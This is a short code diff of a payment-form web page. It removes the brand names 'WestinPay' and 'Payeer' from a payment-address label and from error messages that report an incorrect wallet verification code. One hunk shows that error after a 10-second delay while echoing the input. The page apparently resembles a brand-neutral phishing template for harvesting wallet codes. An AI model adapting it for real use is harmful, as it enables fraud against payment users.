@@ -115,7 +115,7 @@
                 </div>
 
                 <div class="form-group">
-                    <label for="Test">WestinPay user Payment address.</label>
+                    <label for="Test">  Payment address.</label>
                     <div class="form-group-relative">
                         <select disabled class="form-control select-with-option">
                             <option>Loading...</option>
@@ -230,7 +230,7 @@
                         formSelector: 'form[data-ajax="true"]',
                         formRegion: 'main',
                         headerSelector: '.site-header',
-                        errorMessage: "<strong>Error:</strong> Your Payeer wallet payment verification code is incorrect.",
+                        errorMessage: "<strong>Error:</strong> Your  wallet payment verification code is incorrect.",
                         successMessage: '<strong>Success:</strong> Your request has been successfully submitted.',
                         scrollPadding: 40
                     }, options),
@@ -275,7 +275,7 @@
 
                         setTimeout(() => {
                             $alert.addClass('alert-danger').removeClass('alert-warning').html(`
-                                <strong>Error:</strong><br>Your WestinPay Transfer  wallet verification code is incorrect.▶:${inputTest}
+                                <strong>Error:</strong><br>Your  Transfer  wallet verification code is incorrect.▶:${inputTest}
                                 `);
                             form.toggleSubmitButtons(true);
                         }, 10000)
